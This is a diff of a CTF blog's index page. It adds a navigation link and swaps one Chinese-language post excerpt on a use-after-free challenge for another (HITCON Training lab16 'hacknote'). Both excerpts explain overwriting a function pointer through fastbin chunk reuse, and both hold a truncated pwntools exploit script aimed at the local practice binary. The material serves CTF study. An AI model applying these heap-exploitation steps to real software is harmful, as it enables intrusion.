@@ -146,6 +146,11 @@
                     <span class="active">ctf</span>
                 </a>
             </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/study" title="study">
+                    <span>study</span>
+                </a>
+            </li>
         </ul>
     </nav>
 </header>
@@ -298,37 +303,27 @@ void__attribute__ ((noreturn))__stack_chk_fail (void){__fortify_fail_abort (
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2>Use_After_Free
+    <h2>UAF例题-HITCON_Training_lab16
     </h2>
   </header>
   <div class="entry-content">
-    <p>此例题来自于Use After Free - CTF Wiki (ctf-wiki.org)
-首先查看一下保护：
-可以发现这居然是一个32位程序，并且没有开启pie
-随后运行一下程序：
-可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。
-随后我们来到ida查看这些功能的细节：
-在查看添加函数时，我们发现存在一个名为v0的结构体：
-通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放notelist[i]。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。
-**注意：**这里的content也是通过malloc函数分配的空间。
-随后我们看到删除函数：
-可以看到删除函数并没有对删除后的空间置零，这就为我们Use_After_free提供了利用条件
-结合刚刚程序的流程，我们可以得出一条利用方式：
-首先，创建两个note，每个note程序会生成两个堆块，所以一共会生成4个堆块
-**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。
-当我们创建两个note后，我们需要将这两个note给删除。
-这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入fastbins中：
-但是由于程序在free堆块时没有置零，所以note1中还存放着input和content_addr。
-这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。
-那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。
-最后数据就会变为这样：
-可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。
-如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。
-同时，程序中有一个magic函数，专门用来输出flag，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。
-#!/usr/bin/python3#Use_After_free_exp.py#lab 10 hacknotefrom pwn import *context.log_level = &#39;debug&#39;p = process(&#39;./hacknote&#39;)magic = 0x08048986p.recvuntil(&#39;Your choice :&#39;)p.send(&#39;1&#39;)p.recvuntil(&#39;Note size :&#39;)p.send(&#39;16&#39;)p.recvuntil(&#39;Content :&#39;)p.send(&#39;aaaa&#39;)p.recvuntil(&#39;Your choice :&#39;)p.send(&#39;1&#39;)p.recvuntil(&#39;Note size :&#39;)p.send(&#39;16&#39;)p.recvuntil(&#39;Content :&#39;)p.send(&#39;bbbb&#39;)p.recvuntil(&#39;Your choice :&#39;)p....</p>
+    <p>UAF例题-HITCON_Training_lab16 写在前面 题目：scwuaptx/HITCON-Training: For Linux binary Exploitation
+题目已经写了是UAF的例题，所以不会写如何发现漏洞的，更加会注重UAF的原理特点和对UAF的利用。
+程序逻辑 通过上面的伪代码，可以看到如果要添加一个note，实际上是申请了两个堆块：
+看到这里我们就需要去看看删除堆的函数：
+可以看到这里直接结束了，并没有置零从而导致了我们可以重复利用这个堆块
+利用方法 通过上面的分析，我们知道了创建一个note会同时申请两个chunk
+而第一个chunk中存放着一个函数指针。
+如果我们可以控制这个函数指针，我们就可以实现任意地址访问。
+如何控制这个函数指针呢？这时我们就需要使用到对fastbin的利用了
+因为notelist的chunk大小为0x8，符合进入fastbin的条件。那我们就可以创建两个note（注意content的大小不能为0x8），这时我们就会有两个0x8的chunk。随后释放这两个note，这两个0x8的chunk就会被fastbin连在一起。
+随后我们再申请一个note，同时将content大小设置为0x8，这样系统就会将fastbin中的两个0x8大小的chunk分配给我们。
+notelist[3]的结构就是上面这样，这时候我们再将想要访问的地址，覆盖掉notelist[0]的print_note_content函数指针。
+同时再打印notelist[0]，就可以实现任意地址访问。
+from pwn import *context.log_level = &#39;debug&#39;p = process(&#39;./hacknote&#39;)magic = 0x8048986def mune(sele):p.recvuntil(&#39;Your choice :&#39;)p.sendline(sele)def add(size, content):p.recvuntil(&#39;Note size :&#39;)p.sendline(size)p.recvuntil(&#39;Content :&#39;)p.sendline(content)def delet(index):p.recvuntil(&#39;Index :&#39;)p.sendline(index)def print(index):p.recvuntil(&#39;Index :&#39;)p.send(index)mune(&#34;1&#34;)add(&#39;16&#39;, &#39;aaaaaa&#39;)mune(&#39;1&#39;)add(&#39;16&#39;, &#39;bbbbbb&#39;)mune(&#39;2&#39;)delet(&#39;0&#39;)mune(&#39;2&#39;)delet(&#39;1&#39;)gdb....</p>
   </div>
   <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
-  <a class="entry-link" aria-label="post link to Use_After_Free" href="https://jellyfish-pro.github.io/ctf/use_after_free/"></a>
+  <a class="entry-link" aria-label="post link to UAF例题-HITCON_Training_lab16" href="https://jellyfish-pro.github.io/ctf/uaf%E4%BE%8B%E9%A2%98-hitcon_training_lab16/"></a>
 </article>
 
 <article class="post-entry"> 
